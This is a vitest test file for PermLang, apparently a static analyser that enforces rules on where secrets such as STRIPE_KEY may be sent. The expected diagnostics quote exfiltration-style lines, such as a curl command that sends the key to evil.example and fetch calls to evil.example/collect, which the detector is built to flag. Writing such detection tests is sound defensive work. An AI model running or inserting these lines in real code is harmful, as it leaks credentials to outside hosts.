// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: The PermLang Authors

// Data-flow rules: "env(STRIPE_KEY) may only go to net(api.stripe.com)". A function that
// gets hold of the source (reads it, or calls something that reads it and can hand it
// back) and can send to any other host, run a command, or run code that can't be
// verified, directly or through what it calls, fails. It doesn't follow the value itself.

import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { checkFiles, type CheckOptions } from "../src/check.js";
import { BUILTIN_VOCABULARY } from "../src/capability.js";
import { FlowRuleError, checkFlowTargets, parseFlows } from "../src/flows.js";

const fixture = (file: string) => fileURLToPath(new URL(`./flows-fixtures/${file}`, import.meta.url));
const app = fixture("app.ts");
const files = [app, fixture("sinks.ts"), fixture("packages.d.ts")];
const stripeRule = { from: { name: "env", arg: "STRIPE_KEY" }, to: [{ name: "net", arg: "api.stripe.com" }] };
const run = (options: CheckOptions = {}) => checkFiles(files, { flows: [stripeRule], ...options });
const flows = (options: CheckOptions = {}) => run(options).diagnostics.filter((d) => d.code === "PERM009");
const message = (fn: string) => flows().find((d) => d.function === fn)!;

describe("data-flow rules", () => {
  it("fails functions that get the source and can send it somewhere the rule doesn't allow", () => {
    expect(flows().map((d) => `${d.severity} ${d.function}:${d.line} ${d.capability}`)).toEqual([
      "error charge:8 net(analytics.example)",
      "error relay:18 net",
      "error dumpAll:23 net(logs.example)",
      "error dashboard:44 net(analytics.example)",
      "error viaGetter:56 net(evil.example)",
      "error viaField:65 net(evil.example)",
      "error viaCallback:74 net(evil.example)",
      "error viaClient:84 net(evil.example)",
      "error viaExec:89 exec",
      "error viaEval:94 unverifiable",
      "error viaUnsafe:138 unverifiable",
      "error viaHeaders:151 net(evil.example)",
      "error viaStore:162 net(evil.example)",
      "error viaElements:180 net(evil.example)",
      "error viaShorthand:223 net(evil.example)",
      "error viaAnyCallee:233 net(evil.example)",
      "error viaAnyMember:243 net(evil.example)",
      "error viaFunctionReference:257 net(evil.example)",
      "error viaFunctionExpression:269 net(evil.example)",
      "error viaAlias:280 net(evil.example)",
      "error viaDeepCallbacks:290 net(evil.example)",
      "error viaAssignment:330 net(evil.example)",
      "error viaEmail:7 email.send",
      "error viaUnmapped:12 sneaky-http",
      "error viaUnmappedHelper:21 sneaky-http",
      "error viaUntyped:32 untyped-beacon",
      "error viaUntypedClass:38 untyped-beacon",
      "error viaUntypedValue:41 untyped-beacon",
    ]);
  });

  it("says what was read, where it can go, and the path to it", () => {
    const charge = message("charge");
    expect(charge.message).toBe(
      "charge reads env(STRIPE_KEY) and can send to net(analytics.example), through track → fetch(\"https://analytics.example/event\", ...), which the flow rule for env(STRIPE_KEY) doesn't allow.",
    );
    expect(charge.fix).toBe("keep env(STRIPE_KEY) away from that call, or add net(analytics.example) to the rule's \"to\" in permlang.config.json.");
    expect(message("relay").message).toContain("can send to net (a host that can't be determined)");
  });

  it("follows the source through a getter, a function in a field, a callback, or an object built with it", () => {
    expect(message("viaGetter").message).toBe(
      "viaGetter gets env(STRIPE_KEY) from stripeKey and can send to net(evil.example), through fetch(\"https://evil.example/collect\", ...), which the flow rule for env(STRIPE_KEY) doesn't allow.",
    );
    expect(message("viaField").message).toContain("viaField gets env(STRIPE_KEY) from Keys.stripe and can send to net(evil.example)");
    expect(message("viaCallback").message).toMatch(/^viaCallback gets env\(STRIPE_KEY\) from withKey and can send to net\(evil\.example\)/);
    expect(message("viaClient").message).toMatch(/^viaClient gets env\(STRIPE_KEY\) from StripeClient\.constructor and can send/);
  });

  // Found in re-verification: a function that returns nothing can still write the key into an
  // object its caller passes in, and the docs said it couldn't.
  it("follows the source back through an object the caller passes in", () => {
    expect(message("viaHeaders").message).toMatch(/^viaHeaders gets env\(STRIPE_KEY\) from authorize and can send to net\(evil\.example\)/);
    expect(message("viaStore").message).toMatch(/^viaStore gets env\(STRIPE_KEY\) from loadInto and can send to net\(evil\.example\)/);
    expect(message("viaElements").message).toMatch(/^viaElements gets env\(STRIPE_KEY\) from tagLines and can send/);
  });

  it("counts every way an object can be written that it can't rule out", () => {
    const from = (fn: string) => /gets env\(STRIPE_KEY\) from (\S+) /.exec(message(fn).message)?.[1];
    // Passed on as `{ headers }`; called while typed any; a method of a member typed any.
    expect(from("viaShorthand")).toBe("attach");
    expect(from("viaAnyCallee")).toBe("notify");
    expect(from("viaAnyMember")).toBe("record");
    // A callback that writes the elements: a function of its own, or a function expression.
    expect(from("viaFunctionReference")).toBe("tagAll");
    expect(from("viaFunctionExpression")).toBe("tagEach");
    // Kept under another name (`order ?? fallback`, `kept = order`), and callbacks nested deeper than it looks.
    expect(from("viaAlias")).toBe("pickAndTag");
    expect(from("viaAssignment")).toBe("keepAndTag");
    expect(from("viaDeepCallbacks")).toBe("deepRead");
  });

  it("treats a command, or code that can't be verified, as able to send it anywhere", () => {
    expect(message("viaExec").message).toBe(
      "viaExec reads env(STRIPE_KEY) and can run commands, through execSync(\"curl -d \" + process.env.STRIPE_KEY + \" https://evil.exam...), which could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
    );
    expect(message("viaExec").fix).toBe("keep env(STRIPE_KEY) away from that call: no rule can allow it, since a command could send it anywhere.");
    expect(message("viaEval").message).toContain("runs code that can't be verified, through eval(");
    // Found in re-verification: @perm-unsafe accepts code for annotations only. A secret handed
    // to a function marked with it still reaches its eval.
    expect(message("viaUnsafe").message).toBe(
      "viaUnsafe reads env(STRIPE_KEY) and runs code that can't be verified, through render → eval(template), which could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
    );
    const nowhere = { from: stripeRule.from, to: [] };
    expect(flows({ flows: [nowhere] }).find((d) => d.function === "viaExec")!.message).toContain("the flow rule for env(STRIPE_KEY) doesn't let it go anywhere.");
  });

  // Found in re-verification: mailing the key, or handing it to a package with no adapter, passed.
  it("treats an adapter's action as somewhere the data goes, which the rule must list", () => {
    expect(message("viaEmail").message).toBe(
      "viaEmail reads env(STRIPE_KEY) and can reach email.send, through createTransport({ host: \"smtp.example\" }).sendMail({ to: \"ops@example.com\", text: process.env.STRIPE_KEY }), which the flow rule for env(STRIPE_KEY) doesn't allow.",
    );
    expect(message("viaEmail").fix).toBe("keep env(STRIPE_KEY) away from that call, or add email.send to the rule's \"to\" in permlang.config.json.");
    const mailAllowed = { from: stripeRule.from, to: [...stripeRule.to, { name: "email.send" }] };
    expect(flows({ flows: [mailAllowed] }).map((d) => d.function)).not.toContain("viaEmail");
  });

  it("treats a package with no adapter as able to send it anywhere", () => {
    expect(message("viaUnmapped").message).toBe(
      "viaUnmapped reads env(STRIPE_KEY) and calls into sneaky-http, which has no adapter, through post(\"https://evil.example/u\", ...), so it could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
    );
    expect(message("viaUnmapped").fix).toBe(
      "add an adapter manifest for sneaky-http, so PermLang knows where it sends data (see docs/reference.md#adapter-manifests), or keep env(STRIPE_KEY) away from that call.",
    );
    expect(message("viaUnmappedHelper").path).toEqual(["upload", "post(\"https://evil.example/upload\", ...)"]);
    expect(message("viaUntyped").message).toBe(
      "viaUntyped reads env(STRIPE_KEY) and calls into untyped-beacon, whose types can't be found, through beam(process.env.STRIPE_KEY!), so it could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
    );
    expect(message("viaUntyped").fix).toBe("install the types for untyped-beacon, so PermLang can see what it calls, or keep env(STRIPE_KEY) away from that call.");
    // A class from it built with new, and a function from it handed on as a value.
    expect(message("viaUntypedClass").path).toEqual(["new Beacon(process.env.STRIPE_KEY)"]);
    expect(message("viaUntypedValue").path).toEqual(["beam"]);
    // The rule only concerns functions that have the key.
    expect(flows().map((d) => d.function)).not.toContain("unmappedWithoutKey");
    // ...whatever the policy for packages with no adapter: a rule is asked for explicitly.
    expect(flows({ unmapped: "trust" }).map((d) => d.function)).toContain("viaUnmapped");
    // Only a flow rule counts them; what the functions reach is unchanged.
    expect(run().functions.find((f) => f.name === "viaUnmapped")!.actual).toEqual(["env(STRIPE_KEY)"]);
  });

  it("checks that the app capabilities a rule lists are ones adapters define", () => {
    const typo = { from: stripeRule.from, to: [{ name: "email.sent" }] };
    expect(() => run({ flows: [typo] })).toThrow(FlowRuleError);
    expect(() => run({ flows: [typo] })).toThrow(/^flows\[0\]: "to" lists email\.sent, which no adapter defines, so it could never match\. Adapters define: .*email\.send/);
    // With only the built-in capabilities, there are none to suggest.
    expect(() => checkFlowTargets([{ from: stripeRule.from, to: [{ name: "email.send" }] }], BUILTIN_VOCABULARY)).toThrow(
      'flows[0]: "to" lists email.send, which no adapter defines, so it could never match. No adapter defines any.',
    );
    expect(() => checkFlowTargets([stripeRule], BUILTIN_VOCABULARY)).not.toThrow();
  });

  it("allows the hosts the rule lists, and ignores functions that never have the source", () => {
    const functions = flows().map((d) => d.function);
    expect(functions).not.toContain("stripeOnly");
    expect(functions).not.toContain("other");
    expect(functions).not.toContain("track");
    // They read the key, but send it nowhere else.
    expect(functions).not.toContain("stripeKey");
    expect(functions).not.toContain("withKey");
    expect(functions).not.toContain("chargeOnly");
    // It calls chargeOnly, which uses the key but returns nothing and takes no callback.
    expect(functions).not.toContain("checkout");
    // It calls one that returns void or Promise<void>, which can't hand the key back either.
    expect(functions).not.toContain("refund");
    // It assigns to a setter that uses the key: a setter returns nothing.
    expect(functions).not.toContain("configure");
    // It passes an object to one that only reads it (fields, and methods that change nothing).
    expect(functions).not.toContain("checkoutOrder");
    // It calls a logger that takes a string (or a number).
    expect(functions).not.toContain("logged");
    // It passes objects to one that only tests and reads them: conditions, comparisons, `typeof`,
    // unary operators, `delete` and `++` of a field, methods that change nothing (with callbacks,
    // or library functions, that only read), and assigning to the parameter itself.
    expect(functions).not.toContain("checkoutIfReady");
  });

  // Found in review: sketch, which init sets up, turned these into warnings, so a broken rule passed.
  it("fails at every strictness level, sketch included", () => {
    expect(flows({ strictness: "sketch" }).map((d) => d.severity)).toEqual(Array(28).fill("error"));
  });

  it("checks nothing without rules", () => {
    expect(checkFiles(files).diagnostics.filter((d) => d.code === "PERM009")).toEqual([]);
  });

  it("can take a whole category as the source", () => {
    const anyEnv = { from: { name: "env" }, to: [{ name: "net", arg: "api.stripe.com" }] };
    expect(flows({ flows: [anyEnv] }).map((d) => d.function)).toContain("other");
  });

  // Every rule used to read the same one-pass list of functions, so a rule after the first saw none.
  it("checks every rule, whatever its place in the list", () => {
    const unused = { from: { name: "env", arg: "NOT_READ_ANYWHERE" }, to: [] };
    const found = flows().map((d) => `${d.function} ${d.capability}`);
    expect(found.length).toBeGreaterThan(0);
    expect(flows({ flows: [unused, stripeRule] }).map((d) => `${d.function} ${d.capability}`)).toEqual(found);
    expect(flows({ flows: [stripeRule, unused] }).map((d) => `${d.function} ${d.capability}`)).toEqual(found);
  });
});

describe("data-flow rules in permlang.config.json", () => {
  const parse = (raw: unknown) => parseFlows(raw, "permlang.config.json");

  it("are read and validated by the CLI", () => {
    expect(parse([{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)"] }])).toEqual([stripeRule]);
    expect(() => parse([{ from: "env(STRIPE_KEY)" }])).toThrow(/"to" must be a list/);
    expect(() => parse([{ from: "nonsense(", to: [] }])).toThrow(/invalid "from"/);
    expect(() => parse("x")).toThrow(/"flows" must be a list/);
    expect(path.basename(app)).toBe("app.ts");
  });

  it("take environment variables, files, tables, and hosts' responses as sources", () => {
    for (const from of ["env", "env(STRIPE_KEY)", "fs.read(./secrets)", "db.read(customers)", "net(api.internal.example)"]) {
      expect(parse([{ from, to: ["net(api.stripe.com)"] }])).toHaveLength(1);
    }
  });

  // Found in review: these were accepted and then never matched anything.
  it.each([
    [{ from: "env(STRIPE_KEY)", to: ["fs.write(./public)"] }, /flows\[0\]: "to" can only list network hosts, such as "net\(api\.stripe\.com\)", and app capabilities from adapters, such as "email\.send"; "fs\.write\(\.\/public\)" isn't one\./],
    [{ from: "env(STRIPE_KEY)", to: ["env(OTHER)"] }, /"to" can only list network hosts/],
    [{ from: "env(STRIPE_KEY)", to: ["exec"] }, /"to" can only list network hosts/],
    [{ from: "exec", to: [] }, /flows\[0\]: "from" must be data a function can read: env, fs\.read, db\.read, or net, with or without a scope; "exec" isn't\./],
    [{ from: "fs.write(./out)", to: [] }, /"from" must be data a function can read/],
    [{ from: "db.write(users)", to: [] }, /"from" must be data a function can read/],
    [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)"], too: ["net(evil.example)"] }, /flows\[0\] has an unknown setting "too"; a rule has only "from" and "to"\./],
    // Found in re-verification: calls are matched by host only, so these never matched and
    // failed the calls they were meant to allow.
    [{ from: "env(STRIPE_KEY)", to: ["net(https://api.stripe.com)"] }, /flows\[0\]: "net\(https:\/\/api\.stripe\.com\)" names more than a host\. A rule matches the host a call connects to, whatever its scheme, port, or path: write "net\(api\.stripe\.com\)"\./],
    [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com/v1)"] }, /"net\(api\.stripe\.com\/v1\)" names more than a host.*write "net\(api\.stripe\.com\)"/],
    [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com:443)"] }, /"net\(api\.stripe\.com:443\)" names more than a host.*write "net\(api\.stripe\.com\)"/],
    [{ from: "env(STRIPE_KEY)", to: ["net(key@api.stripe.com)"] }, /names more than a host.*write "net\(api\.stripe\.com\)"/],
    [{ from: "env(STRIPE_KEY)", to: ["net(::1)"] }, /"net\(::1\)" names more than a host.*write only the host, such as "net\(api\.stripe\.com\)" or "net\(\[::1\]\)"\./],
    // A URL with no host at all.
    [{ from: "env(STRIPE_KEY)", to: ["net(file:///srv)"] }, /"net\(file:\/\/\/srv\)" names more than a host.*write only the host, such as "net\(api\.stripe\.com\)"/],
    [{ from: "net(https://api.internal.example/v1)", to: [] }, /flows\[0\]: "net\(https:\/\/api\.internal\.example\/v1\)" names more than a host.*write "net\(api\.internal\.example\)"/],
  ])("rejects %j", (rule, reason) => {
    expect(() => parse([rule])).toThrow(reason);
  });

  it("take app capabilities from adapters in \"to\"", () => {
    expect(parse([{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)", "email.send", "payments.refund(stripe)"] }])[0]!.to).toEqual([
      { name: "net", arg: "api.stripe.com" },
      { name: "email.send" },
      { name: "payments.refund", arg: "stripe" },
    ]);
    // No rule can allow code that can't be verified.
    expect(() => parse([{ from: "env(STRIPE_KEY)", to: ["unverifiable"] }])).toThrow(/"to" can only list network hosts/);
  });

  it("takes hosts as calls report them", () => {
    for (const host of ["api.stripe.com", "API.Stripe.com", "[::1]", "localhost", "127.0.0.1"]) {
      expect(parse([{ from: "env(STRIPE_KEY)", to: [`net(${host})`] }])[0]!.to).toEqual([{ name: "net", arg: host }]);
    }
  });
});
